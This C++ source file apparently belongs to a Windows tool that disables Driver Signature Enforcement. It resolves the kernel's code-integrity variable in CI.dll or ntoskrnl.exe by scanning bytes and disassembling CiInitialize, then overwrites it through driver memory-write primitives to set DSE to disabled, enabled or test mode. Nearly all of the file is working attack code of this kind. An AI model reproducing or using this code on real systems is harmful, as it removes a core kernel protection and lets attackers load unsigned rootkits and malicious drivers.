#include <iostream>
#include <Windows.h>
#include "DriverOps.h"
#include "DisableDSE.h"
#include "helpers.h"
#include "hde64.h"



ULONG GetBuildNumber() {

	static auto RtlGetVersion = (RtlGetVersion_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlGetVersion");

	OSVERSIONINFOW osv;

	cZeroMemory(&osv, sizeof(osv));
	osv.dwOSVersionInfoSize = sizeof(osv);
	RtlGetVersion(&osv);

	if ((osv.dwMajorVersion < 6) || (osv.dwMajorVersion == 6 && osv.dwMinorVersion == 0) || (osv.dwBuildNumber <= 7600)) {//NalDrv requires build 7601 or newer
		printf("Unsupported WinNT version");
		return 0;
	}
	return osv.dwBuildNumber;
}

PVOID GetLoadedModulesList(PULONG ReturnLength) {
	NTSTATUS status;
	PVOID buffer;
	ULONG bufferSize = PAGE_SIZE;
	PRTL_PROCESS_MODULES pvModules;
	SYSTEM_INFORMATION_CLASS infoClass;

	if (ReturnLength)
		*ReturnLength = 0;

	//infoClass = SystemModuleInformation;
	infoClass = (SYSTEM_INFORMATION_CLASS)11;

	buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)bufferSize);
	if (buffer == NULL)
		return NULL;

	status = NtQuerySystemInformation(infoClass, buffer, bufferSize, &bufferSize);
	if (status == STATUS_INFO_LENGTH_MISMATCH) {
		HeapFree(GetProcessHeap(), 0, buffer);
		buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)bufferSize);
		status = NtQuerySystemInformation(infoClass, buffer, bufferSize, &bufferSize);
	}

	if (ReturnLength)
		*ReturnLength = bufferSize;

	if (!NT_SUCCESS(status)) {
		if (status == STATUS_BUFFER_OVERFLOW) {
			pvModules = (PRTL_PROCESS_MODULES)buffer;
			if (pvModules->NumberOfModules != 0)
				return buffer;
		}
		printf("Could not query system information: %lx", status);
		//return NULL;
	}
	else {
		return buffer;
	}

	if (buffer)
		HeapFree(GetProcessHeap(), 0, buffer);

	return NULL;
}

ULONG_PTR GetModuleBaseByName(const char* ModuleName, PULONG ImageSize) {
	ULONG_PTR returnAddress = 0;
	PRTL_PROCESS_MODULES modules;

	if (ImageSize)
		*ImageSize = 0;

	modules = (PRTL_PROCESS_MODULES)GetLoadedModulesList(NULL);
	if (modules != NULL) {
		for (ULONG i = 0; i < modules->NumberOfModules; i++) {

			if (strcmp((const CHAR*)&modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName, ModuleName) == 0) {
				returnAddress = (ULONG_PTR)modules->Modules[i].ImageBase;
				if (ImageSize)
					*ImageSize = modules->Modules[i].ImageSize;
				break;
			}
		}
		HeapFree(GetProcessHeap(), 0, modules);
	}
	return returnAddress;
}

NTSTATUS QueryImageSize(PVOID ImageBase, PSIZE_T ImageSize) {
	NTSTATUS status;
	LDR_DATA_TABLE_ENTRY* ldrEntry = NULL;

	*ImageSize = 0;
	static auto LdrFindEntryForAddress = (LdrFindEntryForAddress_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "LdrFindEntryForAddress");
	status = LdrFindEntryForAddress(ImageBase, &ldrEntry);

	if (NT_SUCCESS(status)) {
		*ImageSize = (ULONG)ldrEntry->Reserved3[1]; //sizeofimage
	}
	return status;
}

NTSTATUS QueryCiEnabled(HMODULE ImageMappedBase, ULONG_PTR ImageLoadedBase, ULONG_PTR* ResolvedAddress, SIZE_T SizeOfImage) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	SIZE_T c;
	LONG rel = 0;

	*ResolvedAddress = 0;

	for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
		if (*(PDWORD)((PBYTE)ImageMappedBase + c) == (0xec40375 * 0x2 + 0x1)) {//0x1d8806eb
			rel = *(PLONG)((PBYTE)ImageMappedBase + c + 4);
			*ResolvedAddress = ImageLoadedBase + c + 8 + rel;
			status = STATUS_SUCCESS;
			break;
		}
	}
	return status;
}

ULONG CheckInstructionBlock(PBYTE Code, ULONG Offset) {
	ULONG offset = Offset;
	hde64s hs;

	cZeroMemory(&hs, sizeof(hs));

	hde64_disasm(&Code[offset], &hs);
	if (hs.flags & F_ERROR)
		return 0;
	if (hs.len != 3)
		return 0;

	// mov     r9, rbx
	if (Code[offset] != 0x4C || Code[offset + 1] != 0x8B) {
		return 0;
	}

	offset += hs.len;

	hde64_disasm(&Code[offset], &hs);
	if (hs.flags & F_ERROR)
		return 0;
	if (hs.len != 3)
		return 0;

	// mov     r8, rdi
	if (Code[offset] != 0x4C || Code[offset + 1] != 0x8B) {
		return 0;
	}

	offset += hs.len;

	hde64_disasm(&Code[offset], &hs);
	if (hs.flags & F_ERROR)
		return 0;
	if (hs.len != 3)
		return 0;

	// mov     rdx, rsi
	if (Code[offset] != 0x48 || Code[offset + 1] != 0x8B) {
		return 0;
	}

	offset += hs.len;

	hde64_disasm(&Code[offset], &hs);
	if (hs.flags & F_ERROR)
		return 0;
	if (hs.len != 2)
		return 0;

	// mov     ecx, ebp
	if (Code[offset] != 0x8B || Code[offset + 1] != 0xCD) {
		return 0;
	}
	return offset + hs.len;
}


NTSTATUS QueryCiOptions(HMODULE ImageMappedBase, ULONG_PTR ImageLoadedBase, ULONG_PTR* ResolvedAddress, ULONG buildNumber) {
	PBYTE ptrCode = NULL;
	ULONG offset, k, expectedLength;
	LONG relativeValue = 0;
	ULONG_PTR resolvedAddress = 0;

	hde64s hs;

	*ResolvedAddress = 0ULL;

	ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, "CiInitialize");
	if (ptrCode == NULL)
		return STATUS_PROCEDURE_NOT_FOUND;

	cZeroMemory(&hs, sizeof(hs));
	offset = 0;

	if (buildNumber < 16299) {
		expectedLength = 5;

		do {
			hde64_disasm(&ptrCode[offset], &hs);
			if (hs.flags & F_ERROR)
				break;

			if (hs.len == expectedLength) { //test if jmp
				// jmp CipInitialize
				if (ptrCode[offset] == 0xE9) {
					relativeValue = *(PLONG)(ptrCode + offset + 1);
					break;
				}
			}
			offset += hs.len;
		} while (offset < 256);
	}
	else {
		expectedLength = 3;

		do {
			hde64_disasm(&ptrCode[offset], &hs);
			if (hs.flags & F_ERROR)
				break;

			if (hs.len == expectedLength) {
				// Parameters for the CipInitialize.
				k = CheckInstructionBlock(ptrCode, offset);

				if (k != 0) {
					expectedLength = 5;
					hde64_disasm(&ptrCode[k], &hs);
					if (hs.flags & F_ERROR)
						break;
					// call CipInitialize
					if (hs.len == expectedLength) {
						if (ptrCode[k] == 0xE8) {
							offset = k;
							relativeValue = *(PLONG)(ptrCode + k + 1);
							break;
						}
					}
				}
			}
			offset += hs.len;
		} while (offset < 256);
	}

	if (relativeValue == 0)
		return STATUS_UNSUCCESSFUL;

	ptrCode = ptrCode + offset + hs.len + relativeValue;
	relativeValue = 0;
	offset = 0;
	expectedLength = 6;

	do {
		hde64_disasm(&ptrCode[offset], &hs);
		if (hs.flags & F_ERROR)
			break;

		if (hs.len == expectedLength) { //test if mov
			if (*(PUSHORT)(ptrCode + offset) == 0x0d89) {
				relativeValue = *(PLONG)(ptrCode + offset + 2);
				break;
			}
		}
		offset += hs.len;
	} while (offset < 256);

	if (relativeValue == 0)
		return STATUS_UNSUCCESSFUL;


	ptrCode = ptrCode + offset + hs.len + relativeValue;
	resolvedAddress = ImageLoadedBase + ptrCode - (PBYTE)ImageMappedBase;

	*ResolvedAddress = resolvedAddress;
	return STATUS_SUCCESS;
}

ULONG_PTR AnalyzeCi()
{

	ULONG buildNumber = GetBuildNumber();

	NTSTATUS status;
	ULONG loadedImageSize = 0;
	SIZE_T sizeOfImage = 0;
	ULONG_PTR result = 0, imageLoadedBase, kernelAddress = 0;
	const char* moduleNameA = NULL;
	PCWSTR moduleNameW = NULL;
	HMODULE mappedImageBase;


	if (buildNumber < 9600) {//WIN8
		moduleNameA = "ntoskrnl.exe";
		moduleNameW = L"ntoskrnl.exe";
	}
	else {
		moduleNameA = "CI.dll";
		moduleNameW = L"CI.dll";
	}

	imageLoadedBase = GetModuleBaseByName(moduleNameA, &loadedImageSize);
	if (imageLoadedBase == 0) {
		printf("Could not query %s image base", moduleNameA);
		return 0;
	}

	WCHAR szFullModuleName[MAX_PATH * 2];
	szFullModuleName[0] = 0;
	if (!GetSystemDirectoryW(szFullModuleName, MAX_PATH))
		return 0;

	wcscat_s(szFullModuleName, MAX_PATH * 2, L"\\");
	wcscat_s(szFullModuleName, MAX_PATH * 2, moduleNameW);

	mappedImageBase = LoadLibraryExW(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);

	if (mappedImageBase) {

		if (buildNumber < 9600) {
			status = QueryImageSize(mappedImageBase, &sizeOfImage);
			if (NT_SUCCESS(status)) {
				status = QueryCiEnabled(mappedImageBase, imageLoadedBase, &kernelAddress, sizeOfImage);
			}
		}
		else {
			status = QueryCiOptions(mappedImageBase, imageLoadedBase, &kernelAddress, buildNumber);
		}

		if (NT_SUCCESS(status)) {
			if (IN_REGION(kernelAddress, imageLoadedBase, loadedImageSize)) {
				result = kernelAddress;
			}
			else {
				printf("Resolved address 0x%llx does not belong to required module", kernelAddress);
			}
		}
		else {
			printf("Failed to locate kernel variable address: %lx", status);
		}
		FreeLibrary(mappedImageBase);

	}
	else {
		printf("Could not load %s", moduleNameA);
	}
	return result;
}


DSE_MODE GetDSE() {
	ULONG_PTR gCiOptionsAddress = AnalyzeCi();
	ULONG OldCiOptionsValue;
	DSE_MODE mode;
	if (!Read32(gCiOptionsAddress, &OldCiOptionsValue)) {
		return Error;
	}

	switch (OldCiOptionsValue) {
		case 0x0:
			printf("Current DSE mode: Disabled\n");
			return Disable;
			break;
		case 0x6:
			printf("Current DSE mode: Enabled\n");
			return Enable;
			break;
		case 0x8:
			printf("Current DSE mode: Test\n");
			return Test;
			break;
	}

	return Error;
}

bool SetDSE(DSE_MODE mode) {

	ULONG_PTR gCiOptionsAddress = AnalyzeCi();

	switch (mode) {
		case Disable:
			printf("Attempt to set DSE mode to Disabled\n");
			break;
		case Enable:
			printf("Attempt to set DSE mode to Enabled\n");
			break;
		case Test:
			printf("Attempt to set DSE mode to Test\n");
			break;
	}

	if (!Write32(gCiOptionsAddress, mode)) {
		return false;
	}

	return true;
}